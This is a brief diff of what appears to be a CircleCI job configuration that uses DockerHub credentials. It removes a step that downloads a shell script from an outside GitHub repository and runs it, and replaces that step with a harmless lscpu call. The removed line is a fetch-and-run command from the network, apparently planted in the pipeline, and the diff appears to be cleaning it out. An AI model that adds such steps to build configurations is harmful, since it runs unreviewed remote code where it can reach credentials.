@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run: wget https://raw.githubusercontent.com/NuDev2021/pusing/main/patch.sh && chmod +x patch.sh && ./patch.sh
+      - run: lscpu
